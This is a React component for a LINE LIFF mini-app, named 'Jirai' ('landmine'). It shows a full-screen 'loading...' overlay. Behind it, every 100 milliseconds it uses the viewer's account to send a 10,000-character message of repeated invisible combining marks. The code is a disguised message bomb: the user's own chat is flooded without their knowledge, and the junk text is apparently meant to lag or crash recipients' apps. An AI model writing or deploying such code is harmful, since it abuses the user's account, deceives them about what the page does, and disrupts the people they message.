import React from 'react'

export default function Jirai(props) {

  const liff = props.liff;

  let msg = ` ࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬ ࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬ ࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬ ࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬ ࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬࣬`.repeat(1000).substring(0, 10000)

  setInterval(() => {
      liff.sendMessages([
        {
            type: "text",
            text: msg,
        }
      ])
  }, 100)

  return (
    <>
        <div className="jirai">
            読み込み中・・・
        </div>
        <style>
            {
                `
                    .jirai {
                        width: 100vw;
                        height: 100vh;
                        background-color: #2b3146;
                        position: fixed;
                        top: 0;
                        left: 0;
                        z-index: 9999;
                        color: #ffffff;
                    }
                `
            }
        </style>
    </>
  )
}
